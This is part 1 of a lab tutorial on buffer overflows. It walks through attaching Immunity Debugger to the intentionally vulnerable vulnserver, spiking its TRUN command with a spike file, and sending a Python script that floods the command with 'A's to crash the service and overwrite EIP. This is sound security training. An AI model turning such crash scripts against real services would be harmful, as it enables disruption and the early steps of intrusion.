# Buffer Overflow Attack Guide - Part 1
## Initial Setup and Spiking

### Prerequisites
- Windows Target Machine (RDP access)
- Kali Linux VM
- Immunity Debugger on Windows
- Python installed on both machines
- vulnserver running on target

### 1. Initial Setup

#### On Windows Target (172.29.98.109)
1. Verify vulnserver is running:
   - Check Task Manager for `vulnserver.exe`
   - Default port is 9999

2. Start Immunity Debugger as Administrator
3. Attach to vulnserver process:
   - File -> Attach
   - Select vulnserver.exe
   - Click Play button to start debugging

#### On Kali VM
1. Test initial connection to vulnserver:
```bash
nc -nv 172.29.98.109 9999
```
You should see a welcome banner from vulnserver.

### 2. Spiking
Create a spike script to test TRUN command for vulnerability.

1. Create `trun.spk` file:
```bash
nano trun.spk
```

2. Add following content:
```
s_readline();
s_string("TRUN ");
s_string_variable("0");
```

3. Run generic_send_tcp:
```bash
generic_send_tcp 172.29.98.109 9999 trun.spk 0 0
```

Create initial Python script to test TRUN command (`trun_test.py`):

```python
#!/usr/bin/python3
import socket
import sys

host = "172.29.98.109"
port = 9999

# Create string of As
buffer = "A" * 100

# Build the payload
payload = "TRUN /.:/" + buffer

# Create socket
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    # Send evil buffer
    print("[*] Sending evil buffer...")
    s.send(bytes(payload, "latin-1"))
    print("[*] Done!")
    
    s.close()
    
except:
    print("[-] Could not connect!")
    sys.exit()
```

### Expected Results
- When running the spike script, observe Immunity Debugger
- If vulnerable, you'll see a crash with many 41s (hex for 'A')
- Note any error messages or crash conditions

### Verification
If successful, you should see:
1. Program crash in Immunity Debugger
2. EIP or other registers containing 41414141
3. Stack window filled with 'A's

### Next Steps
Once spiking confirms vulnerability:
1. Move to fuzzing phase
2. Determine exact crash point
3. Generate unique pattern for offset
